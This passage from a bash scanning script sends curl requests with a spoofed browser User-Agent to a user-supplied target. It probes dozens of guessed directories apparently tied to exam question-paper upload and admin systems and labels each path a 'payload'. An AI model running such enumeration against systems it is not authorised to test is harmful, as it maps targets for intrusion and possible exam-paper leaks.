code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ServiceQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuiteQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuiteQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtDataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtDataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperPanel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperPanel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
